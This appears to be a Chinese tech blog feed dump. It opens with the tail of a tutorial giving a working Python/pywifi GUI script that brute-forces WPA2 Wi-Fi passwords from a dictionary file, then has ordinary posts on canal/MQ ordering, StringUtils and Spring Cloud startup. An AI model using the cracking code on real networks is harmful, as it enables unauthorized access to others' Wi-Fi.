tkinter.filedialog.askopenfilename()</span><br><span class="line">        self.get_value.set(self.filename)</span><br><span class="line"></span><br><span class="line">    # Treeview绑定事件</span><br><span class="line">    def onDBClick(self, event):</span><br><span class="line">        self.sels = event.widget.selection()</span><br><span class="line">        self.get_wifi_value.set(self.wifi_tree.item(self.sels, &quot;values&quot;)[1])</span><br><span class="line"></span><br><span class="line">    # 读取密码字典，进行匹配</span><br><span class="line">    def readPassWord(self):</span><br><span class="line">        self.getFilePath = self.get_value.get()</span><br><span class="line">        self.get_wifissid = self.get_wifi_value.get()</span><br><span class="line">        pwdfilehander = open(self.getFilePath, &quot;r&quot;, errors=&quot;ignore&quot;)</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                self.pwdStr = pwdfilehander.readline()</span><br><span class="line">                if not self.pwdStr:</span><br><span class="line">                    break</span><br><span class="line">                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)</span><br><span class="line">                if self.bool1:</span><br><span class="line">                    self.res = &quot;[*] 密码正确！wifi名：%s，匹配密码：%s &quot; % (self.get_wifissid, self.pwdStr)</span><br><span class="line">                    self.get_wifimm_value.set(self.pwdStr)</span><br><span class="line">                    tkinter.messagebox.showinfo(&#x27;提示&#x27;, &#x27;破解成功！！！&#x27;)</span><br><span class="line">                    print(self.res)</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    self.res = &quot;[*] 密码错误！wifi名:%s，匹配密码：%s&quot; % (self.get_wifissid, self.pwdStr)</span><br><span class="line">                    print(self.res)</span><br><span class="line">                time.sleep(3)</span><br><span class="line">            except:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">    # 对wifi和密码进行匹配</span><br><span class="line">    def connect(self, pwd_Str, wifi_ssid):</span><br><span class="line">        # 创建wifi链接文件</span><br><span class="line">        self.profile = pywifi.Profile()</span><br><span class="line">        self.profile.ssid = wifi_ssid  # wifi名称</span><br><span class="line">        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放</span><br><span class="line">        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法</span><br><span class="line">        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元</span><br><span class="line">        self.profile.key = pwd_Str  # 密码</span><br><span class="line">        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件</span><br><span class="line">        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件</span><br><span class="line">        self.iface.connect(self.tmp_profile)  # 链接</span><br><span class="line">        time.sleep(5)</span><br><span class="line">        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上</span><br><span class="line">            isOK = True</span><br><span class="line">        else:</span><br><span class="line">            isOK = False</span><br><span class="line">        self.iface.disconnect()  # 断开</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        # 检查断开状态</span><br><span class="line">        assert self.iface.status() in \</span><br><span class="line">               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class="line">        return isOK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gui_start():</span><br><span class="line">    init_window = Tk()</span><br><span class="line">    ui = MY_GUI(init_window)</span><br><span class="line">    print(ui)</span><br><span class="line">    ui.set_init_window()</span><br><span class="line">    init_window.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    gui_start()</span><br></pre></td></tr></table></figure><p>脚本运行效果如下：</p><p><img src="/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/5.png"></p><p>以上基于 Python 的 GUI 图形界面开发库 Tkinter，实际上 Python 的 GUI 编程可以借助 PyQt5 来自动生成 UI 代码。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文学习了 Python 暴力破解 WIFI 密码的方法、以及 Python GUI 图形化编程的基础使用。所演示的代码的不足在于均没有使用多线程进行 WIFI 连接测试，实际上因为 WIFI 连接测试需要一定的耗时（3-5秒），故使用多线程将能减少暴力破解过程的等待时间。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wifi密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>canal配合MQ会有乱序的问题吗</title>
      
      <link href="/2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/"/>
      <url>/2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/</url>
      
        <content type="html"><![CDATA[<p>如何实现消息有序？实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。</p><p>在MQ模型中，顺序需由3个阶段去保障</p><ol><li><p>顺序发送： 发送时保持顺序一致</p></li><li><p>顺序存储： broker 存储时保持 顺序一致</p></li><li><p>顺序消费： 消费时 保持 顺序一致</p></li></ol><p><img src="/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/1.png"></p><h2 id="2-消息有序的两大类型"><a href="#2-消息有序的两大类型" class="headerlink" title="2 消息有序的两大类型"></a>2 消息有序的两大类型</h2><p>有序消息，又叫顺序消息(FIFO消息)，指消息的消费顺序和产生顺序相同。</p><p>如订单的生成、付款、发货，这串消息必须按序处理。</p><p>顺序消息又可分为全局有序和局部有序：</p><ul><li><p><strong>全局有序</strong>：整个MQ系统的所有消息严格按照队列先入先出顺序进行消费</p></li><li><p><strong>局部有序</strong>：只保证一部分关键信息的消费顺序</p></li></ul><h3 id="2-1-全局顺序"><a href="#2-1-全局顺序" class="headerlink" title="2.1 全局顺序"></a>2.1 全局顺序</h3><p>一个Topic内所有的消息都发布到同一Q，按FIFO顺序进行发布和消费：</p><p><img src="/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/2.png"></p><p>落地到RocketMQ，如何保证全局有序？</p><p>为了 保证Topic全局消息有序的方式，就是将Topic配置成只有一个唯一的MessageQueue队列， 默认是4个MessageQueue。</p><p>RocketMQ中，可以在发送者发送消息时指定一个MessageSelector对象，让这个对象来决定消息发入哪一个MessageQueue。这样就可以保证一组有序的消息能够发到同一个MessageQueue里。</p><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p>性能要求不高，所有消息严格按照FIFO进行消息发布和消费的场景。</p><h3 id="2-2-分区顺序"><a href="#2-2-分区顺序" class="headerlink" title="2.2 分区顺序"></a>2.2 分区顺序</h3><p>对于指定的一个Topic，所有消息按<code>sharding key</code>进行区块(queue)分区，同一Queue内的消息严格按FIFO发布和消费。</p><ul><li>Sharding key是顺序消息中用来区分不同分区的关键字段，和普通消息的Key完全不同。</li></ul><p><img src="/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/3.png"></p><p>落地到RocketMQ。而MessageQueue是RocketMQ存储消息的最小单元，他们之间的消息都是互相隔离的，在这种情况下，是无法保证消息全局有序的，但是可以保证局部有序。</p><p>默认的做法是，发送消息时，会通过MessageQueue轮询的方式保证消息尽量均匀分布到所有的MessageQueue上，而消费者也就同样需要从多个MessageQueue上消费消息。这就做不到局部有序。</p><p>对于局部有序的要求，只需要将有序的一组消息都存入同一个MessageQueue里，这样MessageQueue的FIFO设计天生就可以保证这一组消息的有序。</p><h4 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h4><p>性能要求高，根据消息中的sharding key去决定消息发送到哪个queue。</p><p>其实大部分的MQ业务场景，我们只需要保证局部有序就可以了。</p><p>例如</p><ul><li><p>我们用QQ聊天，只需要保证一个聊天窗口里的消息有序就可以了。</p></li><li><p>而对于电商订单场景，也只要保证一个订单的所有消息是有序的就可以了。</p></li></ul><h3 id="2-3-对比"><a href="#2-3-对比" class="headerlink" title="2.3 对比"></a>2.3 对比</h3><p><strong>发送方式对比</strong></p><p><img src="/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/4.png"></p><p><strong>存储方式对比</strong></p><ul><li>无</li></ul><p><strong>消费方式对比</strong></p><ul><li><p>有序消费的消费者类型：ConsumeMessageConcurrentlyService 并发消费服务</p></li><li><p>无序消费的消费者类型：ConsumeMessageOrderlyService</p></li></ul><h2 id="3-应用开发维度的实现消息有序需要做的工作："><a href="#3-应用开发维度的实现消息有序需要做的工作：" class="headerlink" title="3 应用开发维度的实现消息有序需要做的工作："></a>3 应用开发维度的实现消息有序需要做的工作：</h2><p>实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。 顺序存储环节，RocketMQ 里的分区队列 MessageQueue 本身是能保证 FIFO 的。</p><p>所以，在应用开发过程中，不能顺序消费消息主要有两个原因：</p><ul><li><p><strong>顺序发送环节，消息发生没有序</strong>：Producer 发送消息到 MessageQueue 时是轮询发送的，消息被发送到不同的分区队列，就不能保证 FIFO 了。</p></li><li><p><strong>顺序消费环节，消息消费无序</strong>：Consumer 默认是多线程并发消费同一个 MessageQueue 的，即使消息是顺序到达的，也不能保证消息顺序消费。</p></li></ul><p>我们知道了实现顺序消息所必要的条件：顺序发送、顺序存储、顺序消费。</p><p>顺序存储 由 Rocketmq 完成，所以，在应用开发层, 消息的顺序需要由两个阶段保证：</p><ul><li><p>消息发送有序</p></li><li><p>消息消费有序</p></li></ul><p><img src="/./2024/07/14/canal%E9%85%8D%E5%90%88MQ%E4%BC%9A%E6%9C%89%E4%B9%B1%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98%E5%90%97/5.png"></p><h2 id="4：canal-MQ，如何实现有序？"><a href="#4：canal-MQ，如何实现有序？" class="headerlink" title="4：canal+MQ，如何实现有序？"></a>4：canal+MQ，如何实现有序？</h2><p>Canal 是阿里巴巴开源的一个增量订阅和消费的中间件，用于基于 MySQL 的数据库增量日志解析（Binlog）。通过 Canal，可以实现对数据库的实时监控和数据同步。</p><p>我们在通过Canal把MySQL的Binlog数据发送到MQ(kafak&#x2F;rocketmq)时，需要关注好几个环节：</p><ul><li><p>Cannal 的有序监听。 Binlog本身是有序的，写入到mq之后如何保障顺序</p></li><li><p>Cannal 的有序发送。</p></li><li><p>顺序存储： broker 存储时保持 顺序一致</p></li><li><p>顺序消费： 消费时 保持 顺序一致</p></li></ul><h3 id="4-1-Cannal-的有序发送"><a href="#4-1-Cannal-的有序发送" class="headerlink" title="4.1 Cannal 的有序发送"></a>4.1 Cannal 的有序发送</h3><p>canal目前支持kafka和rocketmq，在使用 Canal 进行数据同步时，保证数据的有序性是一个重要的问题，尤其是在分布式环境中。在 Kafka 或 RocketMQ 等消息队列中，消息的顺序性和分区策略至关重要。</p><p>canal 本质上都是基于本地文件的方式来支持分区级别的顺序消息，也就是binlog写入mq是可以有一定的顺序性保障，这个保障级别取决于用户的两个配置项：</p><ul><li><p><code>canal.mq.partitionsNum</code></p></li><li><p><code>canal.mq.partitionHash</code></p></li></ul><p>两个配置项 用于控制消息的分区和顺序。两个配置项介绍如下：</p><ol><li><strong>canal.mq.partitionsNum</strong>：</li></ol><ul><li><p><strong>描述</strong>：设置消息队列的分区数量。</p></li><li><p><strong>作用</strong>：决定了消息在消息队列中被分区的数量。不同的分区可以并行处理，但需要注意同一个分区内的消息是有序的。</p></li></ul><ol start="3"><li><strong>canal.mq.partitionHash</strong>：</li></ol><ul><li><p><strong>描述</strong>：设置消息分区的哈希规则。</p></li><li><p><strong>作用</strong>：用于指定分区的哈希策略，可以根据特定的字段进行分区。例如，可以根据表名、主键等字段进行分区，以保证某些关键数据的有序性。</p></li></ul><h3 id="4-2-Cannal-的有序发送示例"><a href="#4-2-Cannal-的有序发送示例" class="headerlink" title="4.2 Cannal 的有序发送示例"></a>4.2 Cannal 的有序发送示例</h3><p>假设我们希望将数据同步到 Kafka，并且需要保证某张表的数据是有序的，可以使用以下配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">canal.mq.partitionsNum=10  </span><br><span class="line">canal.mq.partitionHash=my\_database.my\_table:id  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置解释</p><ol><li><strong>canal.mq.partitionsNum&#x3D;10</strong>：</li></ol><ul><li>表示消息会被分成 10 个分区。每个分区可以并行处理，从而提高处理效率。</li></ul><ol start="3"><li><strong>canal.mq.partitionHash&#x3D;my_database.my_table</strong></li></ol><ul><li><p>针对 <code>my_database.my_table</code> 表的数据，根据 <code>id</code> 字段进行哈希分区。</p></li><li><p>这样可以确保同一个 <code>id</code> 的所有变更都进入同一个分区，从而保证该 <code>id</code> 的变更顺序不变。</p></li></ul><p>通过配置 <code>canal.mq.partitionHash</code>，分区内的消息是有序的，因此只要保证同一实体（如同一行数据）的变更进入同一个分区，就能保证其有序性。</p><h3 id="4-3-Cannal-的使用场景"><a href="#4-3-Cannal-的使用场景" class="headerlink" title="4.3 Cannal 的使用场景"></a>4.3 Cannal 的使用场景</h3><ul><li><p><strong>实时数据同步</strong>：将数据库的变更实时同步到其他系统，如搜索引擎、缓存等。</p></li><li><p><strong>数据备份</strong>：实现数据库的实时备份，确保数据的一致性和完整性。</p></li><li><p><strong>事件驱动架构</strong>：在事件驱动架构中，利用 Canal 将数据库变更作为事件发布到消息队列，供其他系统消费。</p></li></ul><p>通过合理配置 <code>canal.mq.partitionsNum</code> 和 <code>canal.mq.partitionHash</code>，可以在数据同步中既保证有序性，又提高处理效率。<br>伙20天时间提75W年薪offer，逆涨50%，秘诀在这](<a href="https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247491496&idx=1&sn=cb31f7510a7c2efb7daf6cad793860ad&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&amp;mid=2247491496&amp;idx=1&amp;sn=cb31f7510a7c2efb7daf6cad793860ad&amp;scene=21#wechat_redirect</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canal有序性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>isEmpty和isBlank的用法区别居然一半的人答不上来</title>
      
      <link href="/2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/"/>
      <url>/2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/</url>
      
        <content type="html"><![CDATA[<p>也许你两个都不知道,也许你除了isEmpty&#x2F;isNotEmpty&#x2F;isNotBlank&#x2F;isBlank外,并不知道还有<code>isAnyEmpty/isNoneEmpty/isAnyBlank/isNoneBlank</code>的存在, come on ,让我们一起来探索<code>org.apache.commons.lang3.StringUtils;</code>这个工具类.</p><h1 id="isEmpty系列"><a href="#isEmpty系列" class="headerlink" title="isEmpty系列"></a>isEmpty系列</h1><h2 id="StringUtils-isEmpty"><a href="#StringUtils-isEmpty" class="headerlink" title="StringUtils.isEmpty()"></a>StringUtils.isEmpty()</h2><p><code>&gt;&gt;&gt;</code>是否为空. 可以看到 <code>&quot; &quot;</code> 空格是会绕过这种空判断,因为是一个<code>空格</code>,并不是严格的<code>空值</code>,会导致 <code>isEmpty(&quot; &quot;)=false</code></p><ul><li><p>StringUtils.isEmpty(null) &#x3D; true</p></li><li><p>StringUtils.isEmpty(“”) &#x3D; true</p></li><li><p>StringUtils.isEmpty(“ “) &#x3D; false</p></li><li><p>StringUtils.isEmpty(“bob”) &#x3D; false</p></li><li><p>StringUtils.isEmpty(“ bob “) &#x3D; false</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**  </span><br><span class="line">  *  </span><br><span class="line">  * &lt;p&gt;NOTE: This method changed in Lang version 2.0.  </span><br><span class="line">  * It no longer trims the CharSequence.  </span><br><span class="line">  * That functionality is available in isBlank().&lt;/p&gt;  </span><br><span class="line">  *  </span><br><span class="line">  * @param cs  the CharSequence to check, may be null  </span><br><span class="line">  * @return &#123;@code true&#125; if the CharSequence is empty or null  </span><br><span class="line">  * @since 3.0 Changed signature from isEmpty(String) to isEmpty(CharSequence)  </span><br><span class="line">*/  </span><br><span class="line">public static boolean isEmpty(final CharSequence cs) &#123;  </span><br><span class="line">   return cs == null || cs.length() == 0;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="StringUtils-isNotEmpty"><a href="#StringUtils-isNotEmpty" class="headerlink" title="StringUtils.isNotEmpty()"></a>StringUtils.isNotEmpty()</h2><p><code>&gt;&gt;&gt;</code>相当于不为空 , &#x3D; <code>!isEmpty()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static boolean isNotEmpty(final CharSequence cs) &#123;  </span><br><span class="line">    return !isEmpty(cs);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="StringUtils-isAnyEmpty"><a href="#StringUtils-isAnyEmpty" class="headerlink" title="StringUtils.isAnyEmpty()"></a>StringUtils.isAnyEmpty()</h2><p><code>&gt;&gt;&gt;</code>是否有一个为空,<code>只有一个为空,就为true</code>.</p><ul><li><p>StringUtils.isAnyEmpty(null) &#x3D; true</p></li><li><p>StringUtils.isAnyEmpty(null, “foo”) &#x3D; true</p></li><li><p>StringUtils.isAnyEmpty(“”, “bar”) &#x3D; true</p></li><li><p>StringUtils.isAnyEmpty(“bob”, “”) &#x3D; true</p></li><li><p>StringUtils.isAnyEmpty(“ bob “, null) &#x3D; true</p></li><li><p>StringUtils.isAnyEmpty(“ “, “bar”) &#x3D; false</p></li><li><p>StringUtils.isAnyEmpty(“foo”, “bar”) &#x3D; false</p></li></ul><p><img src="/./2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/1.png"></p><h2 id="StringUtils-isNoneEmpty"><a href="#StringUtils-isNoneEmpty" class="headerlink" title="StringUtils.isNoneEmpty()"></a>StringUtils.isNoneEmpty()</h2><p><code>&gt;&gt;&gt;</code>相当于<code>!isAnyEmpty(css)</code> , 必须所有的值都不为空才返回true</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect"></a>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。<a href="https://mp.weixin.qq.com/s?__biz=MzI4NTM1NDgwNw==&mid=2247500365&idx=1&sn=7abfd8b30427d4ac15bb351c3dbb640c&scene=21#wechat_redirect"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**  </span><br><span class="line"> * &lt;p&gt;Checks if none of the CharSequences are empty (&quot;&quot;) or null.&lt;/p&gt;  </span><br><span class="line"> *  </span><br><span class="line"> * &lt;pre&gt;  </span><br><span class="line"> * StringUtils.isNoneEmpty(null)             = false  </span><br><span class="line"> * StringUtils.isNoneEmpty(null, &quot;foo&quot;)      = false  </span><br><span class="line"> * StringUtils.isNoneEmpty(&quot;&quot;, &quot;bar&quot;)        = false  </span><br><span class="line"> * StringUtils.isNoneEmpty(&quot;bob&quot;, &quot;&quot;)        = false  </span><br><span class="line"> * StringUtils.isNoneEmpty(&quot;  bob  &quot;, null)  = false  </span><br><span class="line"> * StringUtils.isNoneEmpty(&quot; &quot;, &quot;bar&quot;)       = true  </span><br><span class="line"> * StringUtils.isNoneEmpty(&quot;foo&quot;, &quot;bar&quot;)     = true  </span><br><span class="line"> * &lt;/pre&gt;  </span><br><span class="line"> *  </span><br><span class="line"> * @param css  the CharSequences to check, may be null or empty  </span><br><span class="line"> * @return &#123;@code true&#125; if none of the CharSequences are empty or null  </span><br><span class="line"> * @since 3.2  </span><br><span class="line"> */  </span><br><span class="line">public static boolean isNoneEmpty(final CharSequence... css) &#123;  </span><br><span class="line">  </span><br><span class="line">  return !isAnyEmpty(css);  </span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h1 id="isBank系列"><a href="#isBank系列" class="headerlink" title="isBank系列"></a>isBank系列</h1><h2 id="StringUtils-isBlank"><a href="#StringUtils-isBlank" class="headerlink" title="StringUtils.isBlank()"></a>StringUtils.isBlank()</h2><p><code>&gt;&gt;&gt;</code> <code>是否为真空值(空格或者空值)</code></p><ul><li><p>StringUtils.isBlank(null) &#x3D; true</p></li><li><p>StringUtils.isBlank(“”) &#x3D; true</p></li><li><p>StringUtils.isBlank(“ “) &#x3D; true</p></li><li><p>StringUtils.isBlank(“bob”) &#x3D; false</p></li><li><p>StringUtils.isBlank(“ bob “) &#x3D; false</p></li></ul><h2 id="StringUtils-isNotBlank"><a href="#StringUtils-isNotBlank" class="headerlink" title="StringUtils.isNotBlank()"></a><img src="/./2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/2.png"><br>StringUtils.isNotBlank()</h2><p><code>&gt;&gt;&gt;</code> <code>是否真的不为空</code>,不是空格或者空值 ,相当于<code>!isBlank();</code></p><h2 id="StringUtils-isAnyBlank"><a href="#StringUtils-isAnyBlank" class="headerlink" title="StringUtils.isAnyBlank()"></a><img src="/./2024/06/29/isEmpty%E5%92%8CisBlank%E7%9A%84%E7%94%A8%E6%B3%95%E5%8C%BA%E5%88%AB%E5%B1%85%E7%84%B6%E4%B8%80%E5%8D%8A%E7%9A%84%E4%BA%BA%E7%AD%94%E4%B8%8D%E4%B8%8A%E6%9D%A5/3.png"><br>StringUtils.isAnyBlank()</h2><p><code>&gt;&gt;&gt;</code>是否包含任何真空值<code>(包含空格或空值)</code></p><ul><li><p>StringUtils.isAnyBlank(null) &#x3D; true</p></li><li><p>StringUtils.isAnyBlank(null, “foo”) &#x3D; true</p></li><li><p>StringUtils.isAnyBlank(null, null) &#x3D; true</p></li><li><p>StringUtils.isAnyBlank(“”, “bar”) &#x3D; true</p></li><li><p>StringUtils.isAnyBlank(“bob”, “”) &#x3D; true</p></li><li><p>StringUtils.isAnyBlank(“ bob “, null) &#x3D; true</p></li><li><p>StringUtils.isAnyBlank(“ “, “bar”) &#x3D; true</p></li><li><p>StringUtils.isAnyBlank(“foo”, “bar”) &#x3D; false</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> /**  </span><br><span class="line"> * &lt;p&gt;Checks if any one of the CharSequences are blank (&quot;&quot;) or null and not whitespace only..&lt;/p&gt;  </span><br><span class="line"> * @param css  the CharSequences to check, may be null or empty  </span><br><span class="line"> * @return &#123;@code true&#125; if any of the CharSequences are blank or null or whitespace only  </span><br><span class="line"> * @since 3.2  </span><br><span class="line"> */  </span><br><span class="line">public static boolean isAnyBlank(final CharSequence... css) &#123;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  if (ArrayUtils.isEmpty(css)) &#123;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    return true;  </span><br><span class="line">  &#125;  </span><br><span class="line">  for (final CharSequence cs : css)&#123;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    if (isBlank(cs)) &#123;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">      return true;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">  return false;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="StringUtils-isNoneBlank"><a href="#StringUtils-isNoneBlank" class="headerlink" title="StringUtils.isNoneBlank()"></a>StringUtils.isNoneBlank()</h2><p><code>&gt;&gt;&gt;</code>是否全部都不包含空值或空格</p><ul><li><p>StringUtils.isNoneBlank(null) &#x3D; false</p></li><li><p>StringUtils.isNoneBlank(null, “foo”) &#x3D; false</p></li><li><p>StringUtils.isNoneBlank(null, null) &#x3D; false</p></li><li><p>StringUtils.isNoneBlank(“”, “bar”) &#x3D; false</p></li><li><p>StringUtils.isNoneBlank(“bob”, “”) &#x3D; false</p></li><li><p>StringUtils.isNoneBlank(“ bob “, null) &#x3D; false</p></li><li><p>StringUtils.isNoneBlank(“ “, “bar”) &#x3D; false</p></li><li><p>StringUtils.isNoneBlank(“foo”, “bar”) &#x3D; true</p></li></ul><pre><code>/**   * &lt;p&gt;Checks if none of the CharSequences are blank (&quot;&quot;) or null and whitespace only..&lt;/p&gt;   * @param css  the CharSequences to check, may be null or empty   * @return &#123;@code true&#125; if none of the CharSequences are blank or null or whitespace only   * @since 3.2   */  public static boolean isNoneBlank(final CharSequence... css) &#123;        return !isAnyBlank(css);  &#125;    </code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串比较 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>10个优化SpringCloud启动时间的方法</title>
      
      <link href="/2024/06/16/10%E4%B8%AA%E4%BC%98%E5%8C%96SpringCloud%E5%90%AF%E5%8A%A8%E6%97%B6%E9%97%B4%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2024/06/16/10%E4%B8%AA%E4%BC%98%E5%8C%96SpringCloud%E5%90%AF%E5%8A%A8%E6%97%B6%E9%97%B4%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>Spring Cloud技术栈专家，真实场景下的Spring Cloud启动优化案例。Spring Cloud应用的启动性能优化通常涉及到减少启动时间和提高启动效率。下面是一些常见的优化场景：</p><h3 id="1-懒加载配置"><a href="#1-懒加载配置" class="headerlink" title="1. 懒加载配置"></a>1. 懒加载配置</h3><p><strong>场景</strong>：减少非必要服务的初始化时间。</p><p><strong>调优</strong>：使用Spring Boot的懒加载特性。</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">@SpringBootApplication  </span><br><span class="line">public class MyApplication &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        SpringApplication app = new SpringApplication(MyApplication.class);  </span><br><span class="line">        app.setLazyInitialization(true);  // 启用懒加载  </span><br><span class="line">        app.run(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-禁用不需要的自动配置"><a href="#2-禁用不需要的自动配置" class="headerlink" title="2. 禁用不需要的自动配置"></a>2. 禁用不需要的自动配置</h3><p><strong>场景</strong>：应用中包含了未使用的自动配置。</p><p><strong>调优</strong>：显式排除不需要的自动配置类。</p><p>最近无意间获得一份阿里大佬写的刷题笔记，一下子打通了我的任督二脉，进大厂原来没那么难。</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">@SpringBootApplication(exclude = &#123;DataSourceAutoConfiguration.class&#125;)  </span><br><span class="line">public class MyApplication &#123;  </span><br><span class="line">    // 主方法...  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-优化日志加载"><a href="#3-优化日志加载" class="headerlink" title="3. 优化日志加载"></a>3. 优化日志加载</h3><p><strong>场景</strong>：日志框架的加载和配置耗时。</p><p><strong>调优</strong>：精简日志配置，避免复杂的日志处理。</p><p><strong>示例</strong>：在<code>application.properties</code>中添加：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">logging.level.root=warn  # 设置日志级别为WARN减少日志输出  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-限制组件扫描"><a href="#4-限制组件扫描" class="headerlink" title="4. 限制组件扫描"></a>4. 限制组件扫描</h3><p><strong>场景</strong>：组件扫描范围过广。</p><p><strong>调优</strong>：明确指定组件扫描的包路径。</p><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">@SpringBootApplication(scanBasePackages = &quot;com.example.myapp&quot;)  </span><br><span class="line">public class MyApplication &#123;  </span><br><span class="line">    // 主方法...  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-数据源懒加载"><a href="#5-数据源懒加载" class="headerlink" title="5. 数据源懒加载"></a>5. 